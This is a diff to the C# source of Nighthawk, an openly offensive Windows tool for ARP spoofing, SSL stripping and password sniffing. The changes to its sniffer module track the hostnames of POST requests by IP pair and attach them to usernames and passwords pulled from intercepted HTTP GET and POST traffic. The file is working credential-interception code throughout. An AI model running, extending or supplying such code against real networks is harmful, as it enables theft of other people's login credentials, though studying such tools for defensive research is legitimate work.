@@ -3,12 +3,13 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Web;
+using System.Net;
 using SharpPcap;
 using PacketDotNet;
 using System.Threading;
 
 /**
-Nighthawk - ARP/NDP spoofing, simple SSL stripping and password sniffing for Windows
+Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
 Copyright (C) 2010  Klemen Bratec
 
 This program is free software: you can redistribute it and/or modify
@@ -48,6 +49,9 @@ namespace Nighthawk
 
         // worker thread
         private Thread worker;
+
+        // collection of POST requests (hostname/url tracking on incomplete packets)
+        private List<SnifferPostRequest> PostRequests;
 
         // events
         public event SnifferResultHandler SnifferResult;
@@ -89,6 +93,7 @@ namespace Nighthawk
         {
             // store our network interface
             device = deviceInfo.Device;
+
             this.deviceInfo = deviceInfo;
         }
 
@@ -100,6 +105,8 @@ namespace Nighthawk
 
             // change status
             Started = true;
+
+            PostRequests = new List<SnifferPostRequest>();
 
             // start a worker thread
             worker = new Thread(new ThreadStart(Worker));
@@ -114,7 +121,7 @@ namespace Nighthawk
             Started = false;
 
             // stop worker thread
-            worker.Abort();
+            worker.Join();
         }
         
         // worker function that actually parses HTTP packets
@@ -153,8 +160,18 @@ namespace Nighthawk
                         {
                             var http = new HttpPacket(packet);
 
+                            // get IP address
+                            var sourceIP = (packet.ParentPacket as IpPacket).SourceAddress;
+                            var destIP = (packet.ParentPacket as IpPacket).DestinationAddress;
+
+                            // save hostnames
+                            if (http.Header.Type == HttpHeader.PacketType.Request && http.Header.ReqType == HttpHeader.RequestType.POST)
+                            {
+                                PostRequests.Add(new SnifferPostRequest {SourceAddress = sourceIP, DestinationAddress = destIP, Hostname = http.Header.Host});
+                            }
+
                             // check for any passwords
-                            SnifferSearch(http);
+                            SnifferSearch(http, sourceIP, destIP);
                         }
                     }
 
@@ -169,7 +186,7 @@ namespace Nighthawk
         }
 
         // credentials search
-        public void SnifferSearch(HttpPacket packet)
+        public void SnifferSearch(HttpPacket packet, IPAddress sourceIP, IPAddress destIP)
         {
             var user = string.Empty;
             var password = string.Empty;
@@ -193,6 +210,9 @@ namespace Nighthawk
                 }
                 catch { }
             }
+
+            // hostname
+            var hostname = packet.Header.Host;
 
             // if there are any GET params
             if (packet.Header.GetParams.Count > 0)
@@ -222,6 +242,7 @@ namespace Nighthawk
             // reset values
             user = string.Empty;
             password = string.Empty;
+            hostname = string.Empty;
 
             // if there are any POST params
             if (packet.PostParams.Count > 0)
@@ -244,7 +265,24 @@ namespace Nighthawk
                 // create output
                 if (user != string.Empty && password != string.Empty)
                 {
-                    Result((packet.Header.Host != string.Empty ? packet.Header.Host : "/"), Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), "POST method", SnifferResultType.HTML);
+                    var comment = "POST method";
+                    hostname = packet.Header.Host;
+
+                    // get hostname/url
+                    if (hostname == string.Empty)
+                    {
+                        var posts = PostRequests.Where(r => (r.SourceAddress.ToString() == sourceIP.ToString() && r.DestinationAddress.ToString() == destIP.ToString()));
+
+                        if (posts.Count() > 0)
+                        {
+                            hostname = posts.First().Hostname;
+                            comment += " *";
+
+                            PostRequests.Remove(posts.First());
+                        }
+                    }
+
+                    Result(hostname, Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), comment, SnifferResultType.HTML);
                }
             }
         }
@@ -255,6 +293,14 @@ namespace Nighthawk
     {
         HTTPAuth,
         HTML
+    }
+
+    // sniffer post request data
+    public class SnifferPostRequest
+    {
+        public IPAddress SourceAddress;
+        public IPAddress DestinationAddress;
+        public string Hostname;
     }
 
     // OnSnifferResult event delegate
